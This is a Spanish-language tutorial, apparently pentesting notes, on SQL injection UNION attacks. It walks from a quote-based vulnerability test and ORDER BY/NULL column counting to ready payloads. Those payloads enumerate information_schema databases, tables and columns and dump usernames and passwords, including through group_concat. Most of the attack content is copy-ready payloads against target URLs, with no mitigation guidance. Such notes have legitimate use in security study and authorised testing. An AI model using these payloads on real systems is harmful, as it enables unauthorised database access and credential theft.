Un **SQL Injection UNION Attack** ocurre cuando un atacante **inyecta una consulta maliciosa con la cláusula `UNION`** para recuperar datos adicionales de la base de datos.

## Concepto de UNION en SQL
El operador `UNION` en SQL se usa para combinar los resultados de dos consultas:
```sql
SELECT columna1, columna2 FROM tabla1 UNION SELECT columna1, columna2 FROM tabla2;
```

**Reglas clave para que `UNION` funcione:**  
✅ Mismo número de columnas en ambas consultas.
✅ Tipos de datos compatibles entre columnas.

## ¿Cómo detectar si un sitio es vulnerable?
1️⃣ **Comprobar si la consulta es vulnerable**  
Prueba ingresando un **'** en un campo de entrada (por ejemplo, en la URL):
```
https://target.com/profile.php?id=1'
```

📌 **Si devuelve error**, puede indicar una posible vulnerabilidad SQLi.

2️⃣ **Determinar el número de columnas**  
Prueba diferentes números en `ORDER BY`:

```
https://target.com/profile.php?id=1 ORDER BY 1 --  
https://target.com/profile.php?id=1 ORDER BY 2 --  
https://target.com/profile.php?id=1 ORDER BY 3 --  
```

📌 **Cuando recibas error, significa que el número de columnas es mayor que el valor probado.**

También puedes usar:

```sql
1 UNION SELECT NULL --  
1 UNION SELECT NULL, NULL --  
1 UNION SELECT NULL, NULL, NULL --  
```

📌 **El número correcto de NULLs indica cuántas columnas tiene la consulta.**

3️⃣ **Extraer datos sensibles**  
Si confirmas que hay SQL Injection, puedes intentar recuperar información sensible:

```sql
1 UNION SELECT username, password FROM users;
```

Si no sabes los nombres de las tablas, prueba con bases de datos estándar:

```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database();
```

Para obtener columnas de una tabla específica:

```sql
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users';
```

📌 **¿Por qué usamos `NULL`?**

- `NULL` es un valor especial que funciona con cualquier tipo de datos.
    
- No sabemos si las columnas son `int`, `varchar`, `date`, etc., así que usamos `NULL` para evitar errores de tipo.
    
- Si la consulta devuelve resultados, significa que **hemos encontrado el número correcto de columnas**.

### MySQL
**Una vez conocido el numero de columnas existentes**
```sql
-- Antes de cada union va un '

-- Para listar todas las DBs existentes
union select schema_name,NULL from information_schema.schemata --


-- Listar todas las tablas de todas las 
union select table_name,NULL from information_schema.tables --

-- Listar una tabla de una DB
union select table_name,NULL from information_schema.tables where table_schema='public' --

-- Listar columnas
union select column_name,NULL from information_schema.columns where table_schema='public' and table_name='users' --

-- Listar contenido
union select usernames,password from users -- -
	-- En caso que la tabla este en una db que no es la    actual (en DB va el nombre)
	union select usernames,password from DB.users -- -
	
	-- En caso que solo te deje usar alguna columna
union select NULL,group_concat(username,':',password) from users -- -
	-- Otra forma de concatenar
union select NULL,group_concat(username||':'||password) from users
```

